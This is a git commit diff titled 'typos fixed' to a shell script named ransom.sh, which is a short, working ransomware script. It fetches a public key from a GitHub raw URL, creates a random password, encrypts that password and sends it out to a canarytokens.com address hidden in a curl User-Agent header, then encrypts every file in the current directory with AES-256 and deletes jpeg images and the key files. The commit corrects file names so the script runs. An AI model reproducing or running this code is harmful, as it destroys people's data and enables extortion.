b1e1e9b1e94790cf2d600fe0a099996c6fc25447
phishermansfriend <phishermansfriend@posteo.de>
2022-11-26 03:43:03 +0100

    typos fixed

--- ransom.sh
+++ ransom.sh
@@ -1,5 +1,5 @@
 curl https://raw.githubusercontent.com/phishermansfriend/playground/main/key.txt | base64 --decode | cat > pubkey.pem
-openssl rand -hex 32 | cat > randpwd && openssl pkeyutl -encrypt -inkey pubkey.pem -pubin -in randompassword -out randpwd.enc
+openssl rand -hex 32 | cat > randpwd && openssl pkeyutl -encrypt -inkey pubkey.pem -pubin -in randpwd -out randpwd.enc
 curl --silent --output /dev/null/ -A "$(base64 -w 0 randpwd.enc)" http://canarytokens.com/feedback/articles/h3ippv782xnzy36hrsbaumzvn/contact.php
-for f in * ; do [ -f $f ] && openssl enc -p -aes-256-cbc -salt -in $f -out $f.enc -pass file:./randpwd; done; rm *.jpeg; rm randompwd*; rm pubkey.pem*
+for f in * ; do [ -f $f ] && openssl enc -p -aes-256-cbc -salt -in $f -out $f.enc -pass file:./randpwd; done; rm *.jpeg; rm randpwd*; rm pubkey.pem*
 
